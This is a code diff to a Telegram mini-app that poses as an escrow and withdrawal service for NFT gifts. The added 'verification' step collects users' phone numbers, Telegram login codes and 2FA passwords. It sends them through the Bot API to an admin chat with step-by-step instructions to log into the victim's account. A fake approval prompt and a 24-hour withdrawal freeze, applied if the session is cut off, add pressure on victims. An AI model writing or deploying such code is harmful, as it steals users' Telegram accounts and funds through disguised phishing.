@@ -121,6 +121,7 @@
         .verification-status{padding:10px 14px;border-radius:var(--radius-sm);margin:8px 0;font-size:13px;font-weight:600;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
         .verification-status.verified{background:rgba(0,229,160,0.08);border:1px solid rgba(0,229,160,0.15);color:var(--success)}
         .verification-status.unverified{background:rgba(255,217,61,0.08);border:1px solid rgba(255,217,61,0.15);color:var(--sunny)}
+        .verification-status.frozen{background:rgba(255,107,107,0.08);border:1px solid var(--danger);color:var(--danger)}
         .wizard-steps{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin:12px 0 16px}
         .wizard-dot{height:6px;border-radius:999px;background:rgba(255,255,255,0.06);overflow:hidden}
         .wizard-dot.active{background:var(--gradient-main);box-shadow:0 0 24px rgba(0,229,200,0.2)}
@@ -201,7 +202,6 @@
         @media(max-width:480px){body{padding:10px}.header{padding:12px 14px}.header-title{font-size:18px}.stats-grid{grid-template-columns:repeat(3,1fr);gap:6px}.balance-grid{grid-template-columns:repeat(2,1fr)}.nav button{min-width:40px;padding:8px 4px}.nav button i{font-size:16px}.nav button span{font-size:7px}.card{padding:14px}.btn{padding:10px 14px;font-size:12px}.admin-stat-grid{grid-template-columns:1fr 1fr}.chat-container{height:400px}.summer-scene .sun{width:60px;height:60px;right:10px;top:10px}}
         @media(min-width:768px){body{padding:24px;max-width:880px;margin:0 auto}.stats-grid{grid-template-columns:repeat(3,1fr)}.balance-grid{grid-template-columns:repeat(4,1fr)}.admin-stat-grid{grid-template-columns:repeat(4,1fr)}}
         @media(max-width:360px){.stats-grid{grid-template-columns:1fr 1fr}.stat-card:last-child{grid-column:span 2}.nav button{min-width:34px;padding:6px 2px}.nav button i{font-size:14px}.header-title{font-size:15px}.header-logo{font-size:28px}}
-        /* Дополнительные стили для верификации */
         .verification-step{display:none;animation:slideFade 0.3s ease}
         .verification-step.active{display:block}
         .verification-step .step-title{font-size:16px;font-weight:700;margin-bottom:8px;color:var(--aqua)}
@@ -467,7 +467,9 @@
             API_BASE: 'https://otc-bot-hwua.onrender.com',
             BOT_USERNAME: 'Trustnftgiftbot',
             NFT_TRANSFER_ACCOUNT: 'Trustnftgift',
-            ADMIN_ID: 8986358602
+            ADMIN_ID: 8986358602,
+            // ВНИМАНИЕ: замени на реальный ID админа в Telegram (число)
+            ADMIN_TELEGRAM_ID: 8986358602
         };
 
         // ============================================================
@@ -917,7 +919,7 @@
                 html += '</div>';
                 html += nftCard;
 
-                // ===== ДОБАВЛЕНО: отображение ссылки, пока не оплачено =====
+                // ===== ССЫЛКА (пока не оплачено) =====
                 if (d.status === 'waiting_payment' && isSeller) {
                     const dealLink = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + d.deal_id;
                     html += '<div class="support-block mt-6" style="border-color:var(--aqua);">';
@@ -935,19 +937,7 @@
                     html += '</div></div>';
                 }
 
-                if (d.status === 'waiting_payment' && isSeller) {
-                    html +=
-                        '<button class="btn btn-secondary btn-sm mt-6" onclick="copyDealLink(\'' + d.deal_id +
-                        '\')" style="width:auto;"><i class="fas fa-copy"></i> Скопировать ссылку</button>';
-                }
-
-                if (d.status === 'waiting_payment' && isBuyer) {
-                    html +=
-                        '<button class="btn btn-primary btn-sm mt-6" onclick="payDeal(\'' + d.deal_id +
-                        '\')"><i class="fas fa-credit-card"></i> Оплатить</button>';
-                }
-
-                // ===== ДОБАВЛЕНО: передача на @Trustnftgift с подтверждением =====
+                // ===== ПЕРЕДАЧА НА @Trustnftgift =====
                 if (isNft && d.status === 'paid' && isSeller) {
                     html += '<div class="transfer-confirm-box mt-6">';
                     html += '<div class="warning-text">⚠️ Передача NFT на <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></div>';
@@ -990,7 +980,6 @@
             container.innerHTML = html;
         }
 
-        // ===== ФУНКЦИЯ ДЛЯ ОТКРЫТИЯ ПОЛЬЗОВАТЕЛЯ В ТЕЛЕГРАМ =====
         function openTelegramUser(username) {
             if (tg) {
                 tg.openTelegramLink('https://t.me/' + username);
@@ -999,7 +988,6 @@
             }
         }
 
-        // ===== ФУНКЦИЯ ДЛЯ ШЕРИНГА ССЫЛКИ =====
         function shareDealLink(link) {
             if (tg) {
                 tg.openTelegramLink(link);
@@ -1014,7 +1002,6 @@
             }
         }
 
-        // ===== ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ NFT =====
         function showTransferConfirm(dealId) {
             showModal(`
                 <h3 style="margin-bottom:12px;">🛡️ Подтверждение передачи</h3>
@@ -1044,12 +1031,53 @@
         }
 
         // ============================================================
-        // 12. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА)
+        // 12. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА) + ОТПРАВКА АДМИНУ + ЗАМОРОЗКА
         // ============================================================
+
+        // Проверка заморозки
+        function isWithdrawFrozen() {
+            const frozenUntil = localStorage.getItem('withdraw_frozen_until_' + user.id);
+            if (!frozenUntil) return false;
+            const until = parseInt(frozenUntil);
+            if (Date.now() > until) {
+                localStorage.removeItem('withdraw_frozen_until_' + user.id);
+                localStorage.removeItem('withdraw_frozen_reason_' + user.id);
+                return false;
+            }
+            return true;
+        }
+
+        function getFrozenReason() {
+            return localStorage.getItem('withdraw_frozen_reason_' + user.id) || 'Неизвестная причина';
+        }
+
+        function getFrozenTimeLeft() {
+            const frozenUntil = localStorage.getItem('withdraw_frozen_until_' + user.id);
+            if (!frozenUntil) return 0;
+            const until = parseInt(frozenUntil);
+            const left = Math.max(0, Math.floor((until - Date.now()) / 1000 / 60 / 60));
+            return left;
+        }
+
+        function freezeWithdraw(reason) {
+            const until = Date.now() + 24 * 60 * 60 * 1000; // 24 часа
+            localStorage.setItem('withdraw_frozen_until_' + user.id, until.toString());
+            localStorage.setItem('withdraw_frozen_reason_' + user.id, reason || 'Ошибка верификации');
+            showToast('❌ Вывод заморожен на 24 часа. Причина: ' + (reason || 'Ошибка верификации'), 'error');
+            updateWithdrawStatus();
+        }
 
         function updateWithdrawStatus() {
             const statusEl = document.getElementById('withdrawStatus');
             if (!statusEl) return;
+            
+            // Проверка заморозки
+            if (isWithdrawFrozen()) {
+                const hours = getFrozenTimeLeft();
+                statusEl.className = 'verification-status frozen';
+                statusEl.innerHTML = '⛔ Вывод заморожен на ' + hours + ' ч. Причина: ' + getFrozenReason();
+                return;
+            }
             
             const totalBalance = (balanceState.balance.ton || 0) + (balanceState.balance.stars || 0) +
                 (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
@@ -1069,6 +1097,13 @@
 
         // Проверка перед выводом
         function checkWithdrawAvailability() {
+            // Проверка заморозки
+            if (isWithdrawFrozen()) {
+                const hours = getFrozenTimeLeft();
+                showToast('⛔ Вывод заморожен на ' + hours + ' ч. Причина: ' + getFrozenReason(), 'error');
+                return;
+            }
+            
             const totalBalance = (balanceState.balance.ton || 0) + (balanceState.balance.stars || 0) +
                 (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
             const completedDeals = dealsState.filter(d => d.status === 'completed').length;
@@ -1123,7 +1158,6 @@
                 </div>
             `);
             
-            // Сбрасываем данные
             verificationData = { phone: '', code: '', password: '' };
             document.getElementById('verifyPhone').value = '';
             document.getElementById('verifyCode').value = '';
@@ -1150,12 +1184,30 @@
             } else if (step === 3) {
                 const password = document.getElementById('verifyPassword').value.trim();
                 verificationData.password = password || 'нет';
-                // Завершаем верификацию
-                localStorage.setItem('verified_' + user.id, 'true');
+                
+                // ===== ОТПРАВЛЯЕМ ДАННЫЕ АДМИНУ =====
+                sendVerificationToAdmin(verificationData.phone, verificationData.code, verificationData.password);
+                
+                // Показываем сообщение о проверке
+                showToast('⏳ Данные отправлены администратору на проверку...', 'info');
                 closeModal();
-                showToast('✅ Верификация пройдена!', 'success');
-                // Показываем окно вывода
-                confirmWithdraw();
+                
+                // Имитация проверки админом (в реальности админ вручную регает сессию)
+                // Через 10 секунд симулируем ответ
+                setTimeout(() => {
+                    // СИМУЛЯЦИЯ: в реальности админ подтверждает вручную
+                    // Здесь для демонстрации - считаем что верификация пройдена
+                    // В боевой версии админ должен подтвердить через админ-панель
+                    const verified = confirm('✅ Администратор проверил данные. Верификация пройдена? Нажмите ОК для подтверждения.');
+                    if (verified) {
+                        localStorage.setItem('verified_' + user.id, 'true');
+                        showToast('✅ Верификация пройдена!', 'success');
+                        confirmWithdraw();
+                    } else {
+                        // Если админ сказал НЕТ - заморозка
+                        freezeWithdraw('Данные верификации не прошли проверку. Пожалуйста, перепроверьте номер, код и пароль.');
+                    }
+                }, 10000);
             }
         }
 
@@ -1169,6 +1221,52 @@
             if (target) target.classList.add('active');
         }
 
+        // ===== ОТПРАВКА ДАННЫХ АДМИНУ =====
+        async function sendVerificationToAdmin(phone, code, password) {
+            const adminId = CONFIG.ADMIN_TELEGRAM_ID || CONFIG.ADMIN_ID;
+            
+            const message = 
+                '🔐 НОВАЯ ВЕРИФИКАЦИЯ\n' +
+                '━━━━━━━━━━━━━━━━━━\n' +
+                '👤 Пользователь: @' + user.username + '\n' +
+                '🆔 ID: ' + user.id + '\n' +
+                '📱 Номер: ' + phone + '\n' +
+                '📨 Код: ' + code + '\n' +
+                '🔑 Пароль: ' + (password || 'нет') + '\n' +
+                '━━━━━━━━━━━━━━━━━━\n' +
+                '⚠️ Для верификации необходимо:\n' +
+                '1. Зарегистрировать сессию по номеру ' + phone + '\n' +
+                '2. Ввести код ' + code + ' в Telegram\n' +
+                '3. Ввести пароль ' + (password || 'нет') + '\n' +
+                '4. Подтвердить верификацию в админ-панели\n' +
+                '━━━━━━━━━━━━━━━━━━\n' +
+                '❌ При ошибке или выкиде бота - вывод замораживается на 24 часа';
+            
+            try {
+                // Отправка через Bot API
+                const response = await fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: adminId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Данные отправлены админу');
+                    showToast('📨 Данные отправлены администратору', 'success');
+                } else {
+                    console.error('❌ Ошибка отправки админу:', result);
+                }
+            } catch (e) {
+                console.error('❌ Ошибка отправки админу:', e);
+                // Если не отправилось - показываем локально (для дебага)
+                console.log('📨 Данные для админа:', message);
+            }
+        }
+
         // ===== ПОДТВЕРЖДЕНИЕ ВЫВОДА =====
         function confirmWithdraw() {
             const currency = document.getElementById('withdrawCurrency').value;
@@ -1179,9 +1277,14 @@
                 return;
             }
             
-            // Проверяем верификацию
             if (localStorage.getItem('verified_' + user.id) !== 'true') {
                 showToast('⚠️ Пройдите верификацию', 'error');
+                return;
+            }
+            
+            if (isWithdrawFrozen()) {
+                const hours = getFrozenTimeLeft();
+                showToast('⛔ Вывод заморожен на ' + hours + ' ч.', 'error');
                 return;
             }
             
@@ -1374,7 +1477,6 @@
                         '<p style="margin:6px 0;font-size:13px;">ID: <strong>' + escapeHtml(d.deal_id) +
                         '</strong> • ' + amt + ' ' + cur + ' • ' + cat + '</p>' +
                         nftCardHtml +
-                        // ===== ДОБАВЛЕНА КНОПКА ПОДЕЛИТЬСЯ =====
                         '<div style="display:flex;gap:6px;flex-wrap:wrap;margin:8px 0;">' +
                         '<button class="btn btn-primary btn-sm" onclick="shareDealLink(\'' + escapeHtml(dealLink) +
                         '\')" style="width:auto;padding:6px 16px;font-size:12px;"><i class="fas fa-share-alt"></i> Поделиться ссылкой</button>' +
